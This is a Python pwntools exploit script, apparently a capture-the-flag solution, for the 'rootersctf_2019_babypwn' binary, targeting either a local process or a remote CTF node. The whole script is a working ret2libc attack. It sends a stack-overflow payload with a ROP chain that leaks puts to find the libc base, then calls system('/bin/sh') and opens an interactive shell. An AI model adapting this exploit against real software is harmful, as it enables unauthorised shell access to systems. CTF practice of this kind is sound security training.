#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./rootersctf_2019_babypwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./rootersctf_2019_babypwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27193)
			elf=ELF('./rootersctf_2019_babypwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]


		pop_rdi=0x0000000000401223
		pay='a'*0x108+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x401060)
		io.recv()
		io.sendline(pay)
		io.recvline()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		pay='a'*0x108+p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rdx_rsi+libc_base)+p64(0)*2+p64(system_addr)+p64(0x401060)
		io.recv()
		io.sendline(pay)
		io.recv()



		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue